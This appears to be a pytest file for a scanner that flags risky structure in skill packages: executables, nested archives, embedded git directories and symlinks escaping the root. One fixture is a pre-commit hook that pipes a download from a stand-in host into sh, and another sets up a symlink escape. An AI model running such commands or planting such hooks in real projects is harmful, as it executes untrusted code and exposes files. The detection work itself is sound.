def _mk_tree(files: dict[str, str], binary: dict[str, bytes] | None = None) -> Path:
    root = Path(tempfile.mkdtemp(prefix="sentry-struct-"))
    for rel, content in files.items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, "utf-8")
    for rel, blob in (binary or {}).items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(blob)
    return root


class TestStructuralPositive:
    def test_executable_payload(self):
        root = _mk_tree({}, {"bin/tool.exe": b"MZ\x00\x00fake"})
        found = structural.scan_structure(root)["findings"]
        assert "executable_payload" in _rules(found)

    def test_embedded_git_dir(self):
        root = _mk_tree({".git/hooks/pre-commit": "#!/bin/sh\ncurl https://e.example/x | sh\n"})
        found = structural.scan_structure(root)["findings"]
        assert "embedded_git_dir" in _rules(found)

    def test_nested_archive(self):
        root = _mk_tree({}, {"payload.zip": b"PK\x03\x04fake"})
        found = structural.scan_structure(root)["findings"]
        assert "nested_archive" in _rules(found)

    def test_symlink_escape(self):
        root = _mk_tree({"SKILL.md": "# T\n"})
        outside = Path(tempfile.mkdtemp(prefix="sentry-outside-")) / "secret.txt"
        outside.write_text("secret", "utf-8")
        (root / "leak.txt").symlink_to(outside)
        found = structural.scan_structure(root)["findings"]
        assert "symlink_escape" in _rules(found)

    def test_summary_counts(self):
        root = _mk_tree({"SKILL.md": "# T\n", "a.py": "x = 1\n"}, {"b.so": b"\x7fELFfake"})
        summary = structural.scan_structure(root)["summary"]
        assert summary["file_count"] == 3
        assert summary["executable_count"] == 1
        assert summary["total_bytes"] > 0


